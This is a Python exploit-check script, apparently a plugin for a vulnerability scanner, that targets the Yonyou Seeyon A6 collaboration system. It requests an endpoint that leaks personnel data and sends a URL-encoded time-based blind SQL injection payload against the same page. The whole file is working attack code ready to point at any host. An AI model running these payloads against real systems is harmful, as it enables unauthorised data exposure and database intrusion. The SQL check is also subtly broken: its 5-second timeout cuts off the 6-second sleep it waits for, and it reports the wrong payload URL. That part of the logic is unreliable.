#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友致远A6协同系统敏感信息泄露&SQL注射
referer: http://www.wooyun.org/bugs/wooyun-2015-0107543
author: Lucifer
description: 用友致远A6 /yyoa/common/selectPersonNew/initData.jsp?trueName=1文件存在敏感信息泄露,并且存在SQL注入漏洞。
'''
import urllib
import requests
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/yyoa/common/selectPersonNew/initData.jsp?trueName=1"
payload2 = "/yyoa/common/selectPersonNew/initData.jsp?trueName=1%25%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28sleep%286%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C1%29%29>64%20AND%20%27%25%27%3D%27"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http ://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if  con.lower().find('personlist')!=-1 and con.lower().find('new person')!=-1:
            Medusa = "{} 存在用友致远A6协同系统敏感信息泄露漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:
        payload_url2 = scheme+"://"+url+payload2
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        start_time = time.time()
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http ://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url2, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url2,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if time.time() - start_time >= 6:
            Medusa = "{} 存在用友致远A6协同系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas